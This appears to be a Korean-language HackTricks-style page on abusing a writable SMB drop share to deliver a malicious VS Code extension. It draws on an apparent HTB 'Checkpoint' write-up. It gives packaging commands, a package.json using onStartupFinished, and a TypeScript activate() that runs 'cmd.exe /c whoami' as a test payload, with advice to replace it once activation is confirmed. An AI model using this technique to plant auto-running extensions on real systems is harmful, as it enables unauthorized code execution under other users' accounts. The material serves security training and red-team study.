# VS Code Extension 드롭 공유 실행

{{#include ../banners/hacktricks-training.md}}

VS Code 확장과 Visual Studio VSSDK 확장은 모두 `.vsix` 패키징을 사용하지만, 매니페스트와 런타임은 서로 다릅니다. 쓰기 가능한 SMB 드롭 공유는 다른 사용자나 배포 작업이 해당 패키지를 VS Code에 설치하는 경우에만 실행 경로가 됩니다. 그러면 확장의 `activate()` 함수가 해당 사용자의 권한으로 확장 호스트에서 실행됩니다. `.vsix`를 공유 폴더에 쓰는 것만으로는 실행되지 않습니다.<sup>[[1]](#references)[[2]](#references)</sup>

## 패키징 및 활성화 워크플로

먼저 해당 VS Code 버전을 사용하는지, 공유 폴더가 실제로 동기화되거나 설치되는지 확인합니다. TypeScript 확장을 생성하고 의도한 Node.js 작업을 `activate()`에 넣습니다. 사용자가 명령을 직접 선택하지 않아도 실행되는 활성화 이벤트(예: `onStartupFinished`)를 사용한 다음, 확장을 컴파일하고 패키징합니다. `engines.vscode`는 **런타임 호환성 기준**입니다. `@types/vscode`를 대상 API 버전에 맞추는 것은 빌드 시 호환성을 위한 조치이지, 설치 시 요구 사항은 아닙니다.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

```bash
npx --package yo --package generator-code -- yo code
npm install --save-dev @types/vscode@^1.118.0
npm install -g @vscode/vsce
vsce package
code --install-extension ./example-0.0.1.vsix   # Test locally before delivery
```

VS Code 1.118을 실행하는 편집기의 경우, 관련 `package.json` 필드는 다음과 같습니다:<sup>[[1]](#references)[[2]](#references)</sup>

```json
{
  "activationEvents": ["onStartupFinished"],
  "engines": { "vscode": "^1.118.0" },
  "devDependencies": { "@types/vscode": "^1.118.0" }
}
```

최소한의 `activate()` 확인으로 확장 호스트에서 명령을 실행하고 출력을 로그에 기록할 수 있습니다. 예상한 계정/세션에서 패키지가 활성화되었는지 확인한 후에만 테스트 동작을 교체하세요. `onStartupFinished` 이벤트는 시작 후에 실행되므로, 편집기가 실제로 시작되고 확장이 설치 및 활성화되기 전까지는 실행의 증거가 아닙니다.<sup>[[1]](#references)[[2]](#references)</sup>

```typescript
import { execFile } from 'node:child_process';
export function activate() {
  execFile('cmd.exe', ['/c', 'whoami'], (_err, stdout) => {
    console.log(stdout);
  });
}
export function deactivate() {}
```

drop share에 쓰기 권한이 있는 공격자는 테스트한 패키지를 업로드하고 이를 사용하는 작업이 실행될 때까지 기다릴 수 있습니다. Checkpoint 예제에서는 복구된 계정의 share 접근 권한으로 쓰기 권한을 얻었습니다. 처음 사용한 낮은 권한의 계정은 share를 읽기만 할 수 있었습니다. 이 두 가지 전제 조건을 구분해야 합니다. **Visual Studio** 확장 프로그램의 경우, 이 VS Code 워크플로가 아니라 별도의 [Visual Studio VSIX extension abuse](visual-studio-vsix-extension-abuse.md) 챕터를 참고하세요.<sup>[[1]](#references)</sup>

## References

- [1] [0xdf - HTB: 체크포인트](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
- [2] [VS Code - 활성화 이벤트](https://code.visualstudio.com/api/references/activation-events)
- [3] [VS Code - 확장 프로그램 게시](https://code.visualstudio.com/api/working-with-extensions/publishing-extension)
